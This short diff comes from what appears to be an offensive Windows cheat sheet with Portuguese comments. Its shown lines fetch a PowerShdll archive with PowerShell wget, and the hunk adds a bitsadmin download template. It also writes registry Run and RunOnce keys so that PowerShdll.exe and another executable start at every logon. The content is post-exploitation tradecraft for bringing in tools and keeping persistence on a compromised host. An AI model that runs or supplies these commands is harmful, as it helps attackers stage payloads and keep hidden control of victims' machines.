@@ -7,6 +7,9 @@ exit
 //Download
 powershell.exe wget https://github.com/cru3za/coisas/blob/master/Powershdll.rar -o C:\windows\temp\Powershdll.rar
 
+//Download cmd
+bitsadmin /transfer mydownloadjob  /download /priority normal URL LOCALE
+
 //persistencia
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PowerShdll /t REG_SZ /d "C:\Windows\Temp\PowerShdll.exe"
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Calc_v2 /t REG_SZ /d "C:\Users\Cru3za\Desktop\cru3za\c++\Calc_v2.exe /MININIZED"
